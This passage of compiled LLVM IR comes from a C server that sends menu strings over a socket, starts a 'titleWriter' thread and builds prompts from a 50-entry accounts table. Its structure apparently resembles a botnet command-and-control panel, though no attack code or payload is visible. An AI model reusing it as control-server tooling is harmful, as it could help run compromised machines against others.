  %1080 = load i32, i32* %4, align 4
  %1081 = getelementptr inbounds [5000 x i8], [5000 x i8]* %80, i64 0, i64 0
  %1082 = getelementptr inbounds [5000 x i8], [5000 x i8]* %80, i64 0, i64 0
  %1083 = call i64 @strlen(i8* %1082) #9
  %1084 = call i64 @send(i32 %1080, i8* %1081, i64 %1083, i32 16384)
  %1085 = icmp eq i64 %1084, -1
  br i1 %1085, label %1086, label %1087

1086:                                             ; preds = %1055
  br label %2807

1087:                                             ; preds = %1055
  %1088 = load i32, i32* %4, align 4
  %1089 = getelementptr inbounds [5000 x i8], [5000 x i8]* %81, i64 0, i64 0
  %1090 = getelementptr inbounds [5000 x i8], [5000 x i8]* %81, i64 0, i64 0
  %1091 = call i64 @strlen(i8* %1090) #9
  %1092 = call i64 @send(i32 %1088, i8* %1089, i64 %1091, i32 16384)
  %1093 = icmp eq i64 %1092, -1
  br i1 %1093, label %1094, label %1095

1094:                                             ; preds = %1087
  br label %2807

1095:                                             ; preds = %1087
  %1096 = load i32, i32* %4, align 4
  %1097 = getelementptr inbounds [5000 x i8], [5000 x i8]* %82, i64 0, i64 0
  %1098 = getelementptr inbounds [5000 x i8], [5000 x i8]* %82, i64 0, i64 0
  %1099 = call i64 @strlen(i8* %1098) #9
  %1100 = call i64 @send(i32 %1096, i8* %1097, i64 %1099, i32 16384)
  %1101 = icmp eq i64 %1100, -1
  br i1 %1101, label %1102, label %1103

1102:                                             ; preds = %1095
  br label %2807

1103:                                             ; preds = %1095
  %1104 = load i32, i32* %4, align 4
  %1105 = getelementptr inbounds [5000 x i8], [5000 x i8]* %83, i64 0, i64 0
  %1106 = getelementptr inbounds [5000 x i8], [5000 x i8]* %83, i64 0, i64 0
  %1107 = call i64 @strlen(i8* %1106) #9
  %1108 = call i64 @send(i32 %1104, i8* %1105, i64 %1107, i32 16384)
  %1109 = icmp eq i64 %1108, -1
  br i1 %1109, label %1110, label %1111

1110:                                             ; preds = %1103
  br label %2807

1111:                                             ; preds = %1103
  %1112 = load i32, i32* %4, align 4
  %1113 = getelementptr inbounds [5000 x i8], [5000 x i8]* %84, i64 0, i64 0
  %1114 = getelementptr inbounds [5000 x i8], [5000 x i8]* %84, i64 0, i64 0
  %1115 = call i64 @strlen(i8* %1114) #9
  %1116 = call i64 @send(i32 %1112, i8* %1113, i64 %1115, i32 16384)
  %1117 = icmp eq i64 %1116, -1
  br i1 %1117, label %1118, label %1119

1118:                                             ; preds = %1111
  br label %2807

1119:                                             ; preds = %1111
  %1120 = load i32, i32* %4, align 4
  %1121 = getelementptr inbounds [5000 x i8], [5000 x i8]* %85, i64 0, i64 0
  %1122 = getelementptr inbounds [5000 x i8], [5000 x i8]* %85, i64 0, i64 0
  %1123 = call i64 @strlen(i8* %1122) #9
  %1124 = call i64 @send(i32 %1120, i8* %1121, i64 %1123, i32 16384)
  %1125 = icmp eq i64 %1124, -1
  br i1 %1125, label %1126, label %1127

1126:                                             ; preds = %1119
  br label %2807

1127:                                             ; preds = %1119
  %1128 = load i32, i32* %4, align 4
  %1129 = getelementptr inbounds [5000 x i8], [5000 x i8]* %86, i64 0, i64 0
  %1130 = getelementptr inbounds [5000 x i8], [5000 x i8]* %86, i64 0, i64 0
  %1131 = call i64 @strlen(i8* %1130) #9
  %1132 = call i64 @send(i32 %1128, i8* %1129, i64 %1131, i32 16384)
  %1133 = icmp eq i64 %1132, -1
  br i1 %1133, label %1134, label %1135

1134:                                             ; preds = %1127
  br label %2807

1135:                                             ; preds = %1127
  %1136 = load i32, i32* %4, align 4
  %1137 = getelementptr inbounds [5000 x i8], [5000 x i8]* %87, i64 0, i64 0
  %1138 = getelementptr inbounds [5000 x i8], [5000 x i8]* %87, i64 0, i64 0
  %1139 = call i64 @strlen(i8* %1138) #9
  %1140 = call i64 @send(i32 %1136, i8* %1137, i64 %1139, i32 16384)
  %1141 = icmp eq i64 %1140, -1
  br i1 %1141, label %1142, label %1143

1142:                                             ; preds = %1135
  br label %2807

1143:                                             ; preds = %1135
  %1144 = load i32, i32* %4, align 4
  %1145 = getelementptr inbounds [5000 x i8], [5000 x i8]* %88, i64 0, i64 0
  %1146 = getelementptr inbounds [5000 x i8], [5000 x i8]* %88, i64 0, i64 0
  %1147 = call i64 @strlen(i8* %1146) #9
  %1148 = call i64 @send(i32 %1144, i8* %1145, i64 %1147, i32 16384)
  %1149 = icmp eq i64 %1148, -1
  br i1 %1149, label %1150, label %1151

1150:                                             ; preds = %1143
  br label %2807

1151:                                             ; preds = %1143
  %1152 = load i32, i32* %4, align 4
  %1153 = getelementptr inbounds [5000 x i8], [5000 x i8]* %89, i64 0, i64 0
  %1154 = getelementptr inbounds [5000 x i8], [5000 x i8]* %89, i64 0, i64 0
  %1155 = call i64 @strlen(i8* %1154) #9
  %1156 = call i64 @send(i32 %1152, i8* %1153, i64 %1155, i32 16384)
  %1157 = icmp eq i64 %1156, -1
  br i1 %1157, label %1158, label %1159

1158:                                             ; preds = %1151
  br label %2807

1159:                                             ; preds = %1151
  %1160 = load i32, i32* %4, align 4
  %1161 = getelementptr inbounds [5000 x i8], [5000 x i8]* %90, i64 0, i64 0
  %1162 = getelementptr inbounds [5000 x i8], [5000 x i8]* %90, i64 0, i64 0
  %1163 = call i64 @strlen(i8* %1162) #9
  %1164 = call i64 @send(i32 %1160, i8* %1161, i64 %1163, i32 16384)
  %1165 = icmp eq i64 %1164, -1
  br i1 %1165, label %1166, label %1167

1166:                                             ; preds = %1159
  br label %2807

1167:                                             ; preds = %1159
  %1168 = load i32, i32* %4, align 4
  %1169 = getelementptr inbounds [5000 x i8], [5000 x i8]* %91, i64 0, i64 0
  %1170 = getelementptr inbounds [5000 x i8], [5000 x i8]* %91, i64 0, i64 0
  %1171 = call i64 @strlen(i8* %1170) #9
  %1172 = call i64 @send(i32 %1168, i8* %1169, i64 %1171, i32 16384)
  %1173 = icmp eq i64 %1172, -1
  br i1 %1173, label %1174, label %1175

1174:                                             ; preds = %1167
  br label %2807

1175:                                             ; preds = %1167
  %1176 = load i8*, i8** %3, align 8
  %1177 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %1176) #8
  br label %1178

1178:                                             ; preds = %1175
  %1179 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %1180 = load i32, i32* %5, align 4
  %1181 = sext i32 %1180 to i64
  %1182 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %1181
  %1183 = getelementptr inbounds %struct.account, %struct.account* %1182, i32 0, i32 0
  %1184 = getelementptr inbounds [200 x i8], [200 x i8]* %1183, i64 0, i64 0
  %1185 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %1186 = call i32 (i8*, i8*, ...) @sprintf(i8* %1179, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.40, i64 0, i64 0), i8* %1184, i8* %1185) #8
  %1187 = load i32, i32* %4, align 4
  %1188 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %1189 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %1190 = call i64 @strlen(i8* %1189) #9
  %1191 = call i64 @send(i32 %1187, i8* %1188, i64 %1190, i32 16384)
  %1192 = icmp eq i64 %1191, -1
  br i1 %1192, label %1193, label %1194

1193:                                             ; preds = %1178
  br label %2807

1194:                                             ; preds = %1178
  br label %1195

1195:                                             ; preds = %1194
  br label %426, !llvm.loop !26

1196:                                             ; preds = %1051
  %1197 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %1198 = call i8* @strstr(i8* %1197, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.111, i64 0, i64 0)) #9
  %1199 = icmp ne i8* %1198, null
  br i1 %1199, label %1204, label %1200

1200:                                             ; preds = %1196
  %1201 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %1202 = call i8* @strstr(i8* %1201, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.112, i64 0, i64 0)) #9
  %1203 = icmp ne i8* %1202, null
  br i1 %1203, label %1204, label %1277

1204:                                             ; preds = %1200, %1196
  %1205 = load i8*, i8** %3, align 8
  %1206 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %1205) #8
  %1207 = getelementptr inbounds [5000 x i8], [5000 x i8]* %92, i64 0, i64 0
  %1208 = call i32 (i8*, i8*, ...) @sprintf(i8* %1207, i8* getelementptr inbounds ([79 x i8], [79 x i8]* @.str.113, i64 0, i64 0)) #8
  %1209 = getelementptr inbounds [5000 x i8], [5000 x i8]* %93, i64 0, i64 0
  %1210 = call i32 (i8*, i8*, ...) @sprintf(i8* %1209, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.69, i64 0, i64 0)) #8
  %1211 = getelementptr inbounds [5000 x i8], [5000 x i8]* %94, i64 0, i64 0
  %1212 = call i32 (i8*, i8*, ...) @sprintf(i8* %1211, i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.114, i64 0, i64 0)) #8
  %1213 = getelementptr inbounds [5000 x i8], [5000 x i8]* %95, i64 0, i64 0
  %1214 = call i32 (i8*, i8*, ...) @sprintf(i8* %1213, i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.115, i64 0, i64 0)) #8
  %1215 = getelementptr inbounds [5000 x i8], [5000 x i8]* %96, i64 0, i64 0
  %1216 = call i32 (i8*, i8*, ...) @sprintf(i8* %1215, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.69, i64 0, i64 0)) #8
  %1217 = load i32, i32* %4, align 4
  %1218 = getelementptr inbounds [5000 x i8], [5000 x i8]* %92, i64 0, i64 0
  %1219 = getelementptr inbounds [5000 x i8], [5000 x i8]* %92, i64 0, i64 0
  %1220 = call i64 @strlen(i8* %1219) #9
  %1221 = call i64 @send(i32 %1217, i8* %1218, i64 %1220, i32 16384)
  %1222 = icmp eq i64 %1221, -1
  br i1 %1222, label %1223, label %1224

1223:                                             ; preds = %1204
  br label %2807

1224:                                             ; preds = %1204
  %1225 = load i32, i32* %4, align 4
  %1226 = getelementptr inbounds [5000 x i8], [5000 x i8]* %93, i64 0, i64 0
  %1227 = getelementptr inbounds [5000 x i8], [5000 x i8]* %93, i64 0, i64 0
  %1228 = call i64 @strlen(i8* %1227) #9
  %1229 = call i64 @send(i32 %1225, i8* %1226, i64 %1228, i32 16384)
  %1230 = icmp eq i64 %1229, -1
  br i1 %1230, label %1231, label %1232

1231:                                             ; preds = %1224
  br label %2807

1232:                                             ; preds = %1224
  %1233 = load i32, i32* %4, align 4
  %1234 = getelementptr inbounds [5000 x i8], [5000 x i8]* %94, i64 0, i64 0
  %1235 = getelementptr inbounds [5000 x i8], [5000 x i8]* %94, i64 0, i64 0
  %1236 = call i64 @strlen(i8* %1235) #9
  %1237 = call i64 @send(i32 %1233, i8* %1234, i64 %1236, i32 16384)
  %1238 = icmp eq i64 %1237, -1
  br i1 %1238, label %1239, label %1240

1239:                                             ; preds = %1232
  br label %2807

1240:                                             ; preds = %1232
  %1241 = load i32, i32* %4, align 4
  %1242 = getelementptr inbounds [5000 x i8], [5000 x i8]* %95, i64 0, i64 0
  %1243 = getelementptr inbounds [5000 x i8], [5000 x i8]* %95, i64 0, i64 0
  %1244 = call i64 @strlen(i8* %1243) #9
  %1245 = call i64 @send(i32 %1241, i8* %1242, i64 %1244, i32 16384)
  %1246 = icmp eq i64 %1245, -1
  br i1 %1246, label %1247, label %1248

1247:                                             ; preds = %1240
  br label %2807

1248:                                             ; preds = %1240
  %1249 = load i32, i32* %4, align 4
  %1250 = getelementptr inbounds [5000 x i8], [5000 x i8]* %96, i64 0, i64 0
  %1251 = getelementptr inbounds [5000 x i8], [5000 x i8]* %96, i64 0, i64 0
  %1252 = call i64 @strlen(i8* %1251) #9
  %1253 = call i64 @send(i32 %1249, i8* %1250, i64 %1252, i32 16384)
  %1254 = icmp eq i64 %1253, -1
  br i1 %1254, label %1255, label %1256

1255:                                             ; preds = %1248
  br label %2807

1256:                                             ; preds = %1248
  %1257 = load i8*, i8** %3, align 8
  %1258 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %1257) #8
  br label %1259

1259:                                             ; preds = %1256
  %1260 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %1261 = load i32, i32* %5, align 4
  %1262 = sext i32 %1261 to i64
  %1263 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %1262
  %1264 = getelementptr inbounds %struct.account, %struct.account* %1263, i32 0, i32 0
  %1265 = getelementptr inbounds [200 x i8], [200 x i8]* %1264, i64 0, i64 0
  %1266 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %1267 = call i32 (i8*, i8*, ...) @sprintf(i8* %1260, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.40, i64 0, i64 0), i8* %1265, i8* %1266) #8
  %1268 = load i32, i32* %4, align 4
  %1269 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %1270 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %1271 = call i64 @strlen(i8* %1270) #9
  %1272 = call i64 @send(i32 %1268, i8* %1269, i64 %1271, i32 16384)
  %1273 = icmp eq i64 %1272, -1
  br i1 %1273, label %1274, label %1275

1274:                                             ; preds = %1259
  br label %2807

1275:                                             ; preds = %1259
  br label %1276

1276:                                             ; preds = %1275
  br label %426, !llvm.loop !26

1277:                                             ; preds = %1200
  %1278 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %1279 = call i8* @strstr(i8* %1278, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.116, i64 0, i64 0)) #9
  %1280 = icmp ne i8* %1279, null
  br i1 %1280, label %1281, label %1375

1281:                                             ; preds = %1277
  br label %1282

1282:                                             ; preds = %1281
  %1283 = load i8*, i8** %3, align 8
  %1284 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %1283) #8
  %1285 = getelementptr inbounds [5000 x i8], [5000 x i8]* %97, i64 0, i64 0
  %1286 = call i32 (i8*, i8*, ...) @sprintf(i8* %1285, i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.117, i64 0, i64 0)) #8
  %1287 = getelementptr inbounds [5000 x i8], [5000 x i8]* %98, i64 0, i64 0
  %1288 = call i32 (i8*, i8*, ...) @sprintf(i8* %1287, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.69, i64 0, i64 0)) #8
  %1289 = getelementptr inbounds [5000 x i8], [5000 x i8]* %99, i64 0, i64 0
  %1290 = call i32 (i8*, i8*, ...) @sprintf(i8* %1289, i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.118, i64 0, i64 0)) #8
  %1291 = getelementptr inbounds [5000 x i8], [5000 x i8]* %100, i64 0, i64 0
  %1292 = call i32 (i8*, i8*, ...) @sprintf(i8* %1291, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.119, i64 0, i64 0)) #8
  %1293 = getelementptr inbounds [5000 x i8], [5000 x i8]* %101, i64 0, i64 0
  %1294 = call i32 (i8*, i8*, ...) @sprintf(i8* %1293, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.120, i64 0, i64 0)) #8
  %1295 = getelementptr inbounds [5000 x i8], [5000 x i8]* %102, i64 0, i64 0
  %1296 = call i32 (i8*, i8*, ...) @sprintf(i8* %1295, i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.121, i64 0, i64 0)) #8
  %1297 = getelementptr inbounds [5000 x i8], [5000 x i8]* %103, i64 0, i64 0
  %1298 = call i32 (i8*, i8*, ...) @sprintf(i8* %1297, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.69, i64 0, i64 0)) #8
  %1299 = load i32, i32* %4, align 4
  %1300 = getelementptr inbounds [5000 x i8], [5000 x i8]* %97, i64 0, i64 0
  %1301 = getelementptr inbounds [5000 x i8], [5000 x i8]* %97, i64 0, i64 0
  %1302 = call i64 @strlen(i8* %1301) #9
  %1303 = call i64 @send(i32 %1299, i8* %1300, i64 %1302, i32 16384)
  %1304 = icmp eq i64 %1303, -1
  br i1 %1304, label %1305, label %1306

1305:                                             ; preds = %1282
  br label %2807

1306:                                             ; preds = %1282
  %1307 = load i32, i32* %4, align 4
  %1308 = getelementptr inbounds [5000 x i8], [5000 x i8]* %98, i64 0, i64 0
  %1309 = getelementptr inbounds [5000 x i8], [5000 x i8]* %98, i64 0, i64 0
  %1310 = call i64 @strlen(i8* %1309) #9
  %1311 = call i64 @send(i32 %1307, i8* %1308, i64 %1310, i32 16384)
  %1312 = icmp eq i64 %1311, -1
  br i1 %1312, label %1313, label %1314

1313:                                             ; preds = %1306
  br label %2807

1314:                                             ; preds = %1306
  %1315 = load i32, i32* %4, align 4
  %1316 = getelementptr inbounds [5000 x i8], [5000 x i8]* %99, i64 0, i64 0
  %1317 = getelementptr inbounds [5000 x i8], [5000 x i8]* %99, i64 0, i64 0
  %1318 = call i64 @strlen(i8* %1317) #9
  %1319 = call i64 @send(i32 %1315, i8* %1316, i64 %1318, i32 16384)
  %1320 = icmp eq i64 %1319, -1
  br i1 %1320, label %1321, label %1322

1321:                                             ; preds = %1314
  br label %2807

1322:                                             ; preds = %1314
  %1323 = load i32, i32* %4, align 4
  %1324 = getelementptr inbounds [5000 x i8], [5000 x i8]* %100, i64 0, i64 0
  %1325 = getelementptr inbounds [5000 x i8], [5000 x i8]* %100, i64 0, i64 0
  %1326 = call i64 @strlen(i8* %1325) #9
  %1327 = call i64 @send(i32 %1323, i8* %1324, i64 %1326, i32 16384)
  %1328 = icmp eq i64 %1327, -1
  br i1 %1328, label %1329, label %1330

1329:                                             ; preds = %1322
  br label %2807

1330:                                             ; preds = %1322
  %1331 = load i32, i32* %4, align 4
  %1332 = getelementptr inbounds [5000 x i8], [5000 x i8]* %101, i64 0, i64 0
  %1333 = getelementptr inbounds [5000 x i8], [5000 x i8]* %101, i64 0, i64 0
  %1334 = call i64 @strlen(i8* %1333) #9
  %1335 = call i64 @send(i32 %1331, i8* %1332, i64 %1334, i32 16384)
  %1336 = icmp eq i64 %1335, -1
  br i1 %1336, label %1337, label %1338

1337:                                             ; preds = %1330
  br label %2807

1338:                                             ; preds = %1330
  %1339 = load i32, i32* %4, align 4
  %1340 = getelementptr inbounds [5000 x i8], [5000 x i8]* %102, i64 0, i64 0
  %1341 = getelementptr inbounds [5000 x i8], [5000 x i8]* %102, i64 0, i64 0
  %1342 = call i64 @strlen(i8* %1341) #9
  %1343 = call i64 @send(i32 %1339, i8* %1340, i64 %1342, i32 16384)
  %1344 = icmp eq i64 %1343, -1
  br i1 %1344, label %1345, label %1346

1345:                                             ; preds = %1338
  br label %2807

1346:                                             ; preds = %1338
  %1347 = load i32, i32* %4, align 4
  %1348 = getelementptr inbounds [5000 x i8], [5000 x i8]* %103, i64 0, i64 0
  %1349 = getelementptr inbounds [5000 x i8], [5000 x i8]* %103, i64 0, i64 0
  %1350 = call i64 @strlen(i8* %1349) #9
  %1351 = call i64 @send(i32 %1347, i8* %1348, i64 %1350, i32 16384)
  %1352 = icmp eq i64 %1351, -1
  br i1 %1352, label %1353, label %1354

1353:                                             ; preds = %1346
  br label %2807

1354:                                             ; preds = %1346
  %1355 = load i8*, i8** %3, align 8
  %1356 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %1355) #8
  br label %1357

1357:                                             ; preds = %1354
  %1358 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %1359 = load i32, i32* %5, align 4
  %1360 = sext i32 %1359 to i64
  %1361 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %1360
  %1362 = getelementptr inbounds %struct.account, %struct.account* %1361, i32 0, i32 0
  %1363 = getelementptr inbounds [200 x i8], [200 x i8]* %1362, i64 0, i64 0
  %1364 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %1365 = call i32 (i8*, i8*, ...) @sprintf(i8* %1358, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.40, i64 0, i64 0), i8* %1363, i8* %1364) #8
  %1366 = load i32, i32* %4, align 4
  %1367 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %1368 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %1369 = call i64 @strlen(i8* %1368) #9
  %1370 = call i64 @send(i32 %1366, i8* %1367, i64 %1369, i32 16384)
  %1371 = icmp eq i64 %1370, -1
  br i1 %1371, label %1372, label %1373

1372:                                             ; preds = %1357
  br label %2807

1373:                                             ; preds = %1357
  br label %1374

1374:                                             ; preds = %1373
  br label %426, !llvm.loop !26

1375:                                             ; preds = %1277
  %1376 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %1377 = call i8* @strstr(i8* %1376, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.122, i64 0, i64 0)) #9
  %1378 = icmp ne i8* %1377, null
  br i1 %1378, label %1379, label %1533

1379:                                             ; preds = %1375
  br label %1380

1380:                                             ; preds = %1379
  %1381 = load i8*, i8** %3, align 8
  %1382 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %1381) #8
  %1383 = getelementptr inbounds [5000 x i8], [5000 x i8]* %104, i64 0, i64 0
  %1384 = call i32 (i8*, i8*, ...) @sprintf(i8* %1383, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.123, i64 0, i64 0)) #8
  %1385 = getelementptr inbounds [5000 x i8], [5000 x i8]* %105, i64 0, i64 0
  %1386 = call i32 (i8*, i8*, ...) @sprintf(i8* %1385, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.69, i64 0, i64 0)) #8
  %1387 = getelementptr inbounds [5000 x i8], [5000 x i8]* %106, i64 0, i64 0
  %1388 = call i32 (i8*, i8*, ...) @sprintf(i8* %1387, i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.124, i64 0, i64 0)) #8
  %1389 = getelementptr inbounds [5000 x i8], [5000 x i8]* %107, i64 0, i64 0
  %1390 = call i32 (i8*, i8*, ...) @sprintf(i8* %1389, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.125, i64 0, i64 0)) #8
  %1391 = getelementptr inbounds [5000 x i8], [5000 x i8]* %108, i64 0, i64 0
  %1392 = call i32 (i8*, i8*, ...) @sprintf(i8* %1391, i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.126, i64 0, i64 0)) #8
  %1393 = getelementptr inbounds [5000 x i8], [5000 x i8]* %109, i64 0, i64 0
  %1394 = call i32 (i8*, i8*, ...) @sprintf(i8* %1393, i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.127, i64 0, i64 0)) #8
  %1395 = getelementptr inbounds [5000 x i8], [5000 x i8]* %110, i64 0, i64 0
  %1396 = call i32 (i8*, i8*, ...) @sprintf(i8* %1395, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.128, i64 0, i64 0)) #8
  %1397 = getelementptr inbounds [5000 x i8], [5000 x i8]* %111, i64 0, i64 0
  %1398 = call i32 (i8*, i8*, ...) @sprintf(i8* %1397, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.69, i64 0, i64 0)) #8
  %1399 = getelementptr inbounds [5000 x i8], [5000 x i8]* %112, i64 0, i64 0
  %1400 = call i32 (i8*, i8*, ...) @sprintf(i8* %1399, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.129, i64 0, i64 0)) #8
  %1401 = getelementptr inbounds [5000 x i8], [5000 x i8]* %113, i64 0, i64 0
  %1402 = call i32 (i8*, i8*, ...) @sprintf(i8* %1401, i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.130, i64 0, i64 0)) #8
  %1403 = getelementptr inbounds [5000 x i8], [5000 x i8]* %114, i64 0, i64 0
  %1404 = call i32 (i8*, i8*, ...) @sprintf(i8* %1403, i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.131, i64 0, i64 0)) #8
  %1405 = getelementptr inbounds [5000 x i8], [5000 x i8]* %115, i64 0, i64 0
  %1406 = call i32 (i8*, i8*, ...) @sprintf(i8* %1405, i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.132, i64 0, i64 0)) #8
  %1407 = getelementptr inbounds [5000 x i8], [5000 x i8]* %116, i64 0, i64 0
  %1408 = call i32 (i8*, i8*, ...) @sprintf(i8* %1407, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.69, i64 0, i64 0)) #8
  %1409 = load i32, i32* %4, align 4
  %1410 = getelementptr inbounds [5000 x i8], [5000 x i8]* %104, i64 0, i64 0
  %1411 = getelementptr inbounds [5000 x i8], [5000 x i8]* %104, i64 0, i64 0
  %1412 = call i64 @strlen(i8* %1411) #9
  %1413 = call i64 @send(i32 %1409, i8* %1410, i64 %1412, i32 16384)
  %1414 = icmp eq i64 %1413, -1
  br i1 %1414, label %1415, label %1416

1415:                                             ; preds = %1380
  br label %2807

1416:                                             ; preds = %1380
  %1417 = load i32, i32* %4, align 4
  %1418 = getelementptr inbounds [5000 x i8], [5000 x i8]* %105, i64 0, i64 0
  %1419 = getelementptr inbounds [5000 x i8], [5000 x i8]* %105, i64 0, i64 0
  %1420 = call i64 @strlen(i8* %1419) #9
  %1421 = call i64 @send(i32 %1417, i8* %1418, i64 %1420, i32 16384)
  %1422 = icmp eq i64 %1421, -1
  br i1 %1422, label %1423, label %1424

1423:                                             ; preds = %1416
  br label %2807

1424:                                             ; preds = %1416
  %1425 = load i32, i32* %4, align 4
  %1426 = getelementptr inbounds [5000 x i8], [5000 x i8]* %106, i64 0, i64 0
  %1427 = getelementptr inbounds [5000 x i8], [5000 x i8]* %106, i64 0, i64 0
  %1428 = call i64 @strlen(i8* %1427) #9
  %1429 = call i64 @send(i32 %1425, i8* %1426, i64 %1428, i32 16384)
  %1430 = icmp eq i64 %1429, -1
  br i1 %1430, label %1431, label %1432

1431:                                             ; preds = %1424
  br label %2807

1432:                                             ; preds = %1424
  %1433 = load i32, i32* %4, align 4
  %1434 = getelementptr inbounds [5000 x i8], [5000 x i8]* %107, i64 0, i64 0
  %1435 = getelementptr inbounds [5000 x i8], [5000 x i8]* %107, i64 0, i64 0
  %1436 = call i64 @strlen(i8* %1435) #9
  %1437 = call i64 @send(i32 %1433, i8* %1434, i64 %1436, i32 16384)
  %1438 = icmp eq i64 %1437, -1
  br i1 %1438, label %1439, label %1440

1439:                                             ; preds = %1432
  br label %2807

1440:                                             ; preds = %1432
  %1441 = load i32, i32* %4, align 4
  %1442 = getelementptr inbounds [5000 x i8], [5000 x i8]* %108, i64 0, i64 0
  %1443 = getelementptr inbounds [5000 x i8], [5000 x i8]* %108, i64 0, i64 0
  %1444 = call i64 @strlen(i8* %1443) #9
  %1445 = call i64 @send(i32 %1441, i8* %1442, i64 %1444, i32 16384)
  %1446 = icmp eq i64 %1445, -1
  br i1 %1446, label %1447, label %1448

1447:                                             ; preds = %1440
  br label %2807

1448:                                             ; preds = %1440
  %1449 = load i32, i32* %4, align 4
  %1450 = getelementptr inbounds [5000 x i8], [5000 x i8]* %109, i64 0, i64 0
  %1451 = getelementptr inbounds [5000 x i8], [5000 x i8]* %109, i64 0, i64 0
  %1452 = call i64 @strlen(i8* %1451) #9
  %1453 = call i64 @send(i32 %1449, i8* %1450, i64 %1452, i32 16384)
  %1454 = icmp eq i64 %1453, -1
  br i1 %1454, label %1455, label %1456

1455:                                             ; preds = %1448
  br label %2807

1456:                                             ; preds = %1448
  %1457 = load i32, i32* %4, align 4
  %1458 = getelementptr inbounds [5000 x i8], [5000 x i8]* %110, i64 0, i64 0
  %1459 = getelementptr inbounds [5000 x i8], [5000 x i8]* %110, i64 0, i64 0
  %1460 = call i64 @strlen(i8* %1459) #9
  %1461 = call i64 @send(i32 %1457, i8* %1458, i64 %1460, i32 16384)
  %1462 = icmp eq i64 %1461, -1
  br i1 %1462, label %1463, label %1464

1463:                                             ; preds = %1456
  br label %2807

1464:                                             ; preds = %1456
  %1465 = load i32, i32* %4, align 4
  %1466 = getelementptr inbounds [5000 x i8], [5000 x i8]* %111, i64 0, i64 0
  %1467 = getelementptr inbounds [5000 x i8], [5000 x i8]* %111, i64 0, i64 0
  %1468 = call i64 @strlen(i8* %1467) #9
  %1469 = call i64 @send(i32 %1465, i8* %1466, i64 %1468, i32 16384)
  %1470 = icmp eq i64 %1469, -1
  br i1 %1470, label %1471, label %1472

1471:                                             ; preds = %1464
  br label %2807

1472:                                             ; preds = %1464
  %1473 = load i32, i32* %4, align 4
  %1474 = getelementptr inbounds [5000 x i8], [5000 x i8]* %112, i64 0, i64 0
  %1475 = getelementptr inbounds [5000 x i8], [5000 x i8]* %112, i64 0, i64 0
  %1476 = call i64 @strlen(i8* %1475) #9
  %1477 = call i64 @send(i32 %1473, i8* %1474, i64 %1476, i32 16384)
  %1478 = icmp eq i64 %1477, -1
  br i1 %1478, label %1479, label %1480

1479:                                             ; preds = %1472
  br label %2807

1480:                                             ; preds = %1472
  %1481 = load i32, i32* %4, align 4
  %1482 = getelementptr inbounds [5000 x i8], [5000 x i8]* %113, i64 0, i64 0
  %1483 = getelementptr inbounds [5000 x i8], [5000 x i8]* %113, i64 0, i64 0
  %1484 = call i64 @strlen(i8* %1483) #9
